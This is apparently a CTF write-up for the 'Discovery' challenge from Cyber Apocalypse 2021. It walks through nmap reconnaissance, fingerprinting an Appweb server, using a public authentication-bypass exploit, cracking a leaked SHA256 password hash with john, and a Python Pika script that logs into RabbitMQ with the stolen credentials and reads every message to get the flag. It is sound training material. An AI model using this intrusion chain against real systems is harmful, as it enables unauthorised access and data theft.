---
title: "Cyber Apocalypse 2021 4/5 - Discovery"
date: 2021-04-28T12:00:03+01:00
draft: false
author: "Thalium team"
tags:
  - CTF
  - Writeup
  - CyberApocalypse2021
---

One of the least solved challenges, yet probably not the most difficult one. It is a Hardware challenge, though it is significantly different from the other challenges of this category. The first thing to spot is that when starting the challenge machine, we have access to two network services:

* an HTTP server, requesting an authentication
* an AMQP broker, `rabbitmq`

<!--more-->

```sh
nmap -sT -p 30476,30042 -sV -sC -n -Pn 138.68.182.108
PORT      STATE SERVICE VERSION
30042/tcp open  http	?
...
30476/tcp open  amqp    RabbitMQ 3.8.2 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@hwcadiscovery-9130-689c6f9d5d-sbf2f
|   copyright: Copyright (c) 2007-2019 Pivotal Software, Inc.
|   information: Licensed under the MPL 1.1. Website: https://rabbitmq.com
|   platform: Erlang/OTP 22.2.7
|   product: RabbitMQ
|   version: 3.8.2
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
```

The web part is rather awkward, as it keeps returning `HTTP 401` asking for authentication credentials. The message bus part is not that friendly either, as it requires to authenticate too. Crawling has not helped a lot, and bruteforcing looks rather inefficient for a CTF. **So what else to do ?**

We picked an HTTP response and took a closer look at it:

```
...
WWW-Authenticate: realm="appweb_control_panel",...,opaque="799d5"...
...
```

Googling `appweb` is not the safest bet, but googling `opaque="799d5"` rapidly returns a [good candidate](https://www.programmersought.com/article/16096870398/).

Digging a bit, we find out two more things:

* an exploit, in Python, which is an authentication bypass, targeting embedthis appweb, which looks promising
* a github reference to the [opaque="799d5"](https://github.com/embedthis/appweb-gpl/blob/master/src/http/httpLib.c#L6063)

Running the exploit against the target works, and allows to access to the content associated with `/`:

```sh
Plane Control Panel
Panel which monitors the sensor readings and other controls.

List of sensors
Perimeter Detection
Radiation Control
Location Tracker
RabbitMQ Access
Exchange    Type    Username    Password Hash    Host    Routing Key    Queue
Direct    anthony_davis    89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1    /        
Base    Topic    leo    27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99    / 
```

Recalling that we have access to a rabbitmq instance, we can now turn those credentials to access to the AMQP broker, and possibly retrieve some messages.

Starting `john` yields `SHA256('winniethepooh') = 89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1` in a snap. The other hash remains uncracked until today.

We can verify that we can access to the AMQP broker using these credentials. The lock to the AMQP broker has gone.

The last step is to peek into the messages flow, using [Pika](https://pika.readthedocs.io/en/stable/) as an AMQP client implementation:

1. Connect and authenticate using `PlainCredentials`
2. Create a queue which will store messages we shall receive
3. Bind this queue to the exchange defined in the web leaked data, 'Base', and asking pass every routing key to this queue, using '#'.

The associated concepts can be found in [rabbitmq documentation associated with topics](https://www.rabbitmq.com/tutorials/tutorial-five-python.html).

The script below will yield the flag:

```python
#!/usr/bin/env python3

from pika import *
import time
from itertools import product

TARGET = '138.68.182.108'
PORT = 30476

def connect(username, password):
  creds = PlainCredentials(username, password)
  params = ConnectionParameters(TARGET, PORT, '/', creds)
  conn = BlockingConnection(params)
  return conn

conn = connect('anthony_davis', 'winniethepooh')
assert(conn)
print(conn)

channel = conn.channel()

result = channel.queue_declare('', exclusive=True)
queue_name = result.method.queue

channel.queue_bind(exchange='Base', queue=queue_name, routing_key='#')

def callback(ch, method, properties, body):
    print(" [x] Received %r" % body.decode())
    time.sleep(body.count(b'.'))
    print(" [x] Done")
    ch.basic_ack(delivery_tag=method.delivery_tag)

channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)

channel.start_consuming()
```

The flag shows up: `CHTB{1_h4v3_n0n4m3@_@}`.
